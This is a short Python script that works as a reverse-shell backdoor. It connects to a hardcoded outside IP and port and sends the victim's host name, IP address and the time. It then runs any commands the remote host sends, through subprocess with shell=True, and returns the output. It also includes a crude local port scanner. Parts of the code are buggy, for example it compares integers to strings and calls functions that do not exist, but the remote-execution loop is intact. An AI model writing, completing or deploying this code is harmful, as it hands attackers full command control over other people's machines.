#!/usr/bin/env python3

#Libs
import socket
import base64
import os, sys
from datetime import datetime
import subprocess

#Setting Time
now = datetime.now()

#Informations
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

#Encode & Decode
def encode(strings):
    return base64.b64encode(strings)
def decode(strings):
    return base64.b64decode(strings)

#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('3.13.191.225', 12863))
s.send("\033[1;42m\033[1;31mConnection Done\033[m\n\n\033[1;92m[+] \033[0;31mHost:\033[1;92m{}\n[+] \033[0;31mIP:\033[1;92m{}\n[+] \033[0;31mDate:\033[1;92m{}\n".format(hostname, ip, now))

#Functions
def scan():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    portas = range(1,1000)
    host = s.recv(1024)
    for port in portas:
        sock.settimeout(0.2)
        code = sock.connect_ex(('', port))
        if '0' == code:
            file = open('PortsOpen.txt', 'w')
            file.write("Port:{} Open\n".format(port))
        elif '1' in code:
            print ("Port:{} Open".format(port))
#Main
def main():
    while True:
        data = decode(s.recv(1024))
        if data[:-1] == '/exit':
            sys.close()
            s.close()
            close()
        elif 'cd' in data:
            os.chdir(data[3:].strip('\n'))
        elif 'pwd' == data:
            s.send(os.getcwd())
        elif 'scan' in data:
            scan()
        print (data)
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read()+proc.stderr.read()
        s.send(output)

def client():
    main()
client()
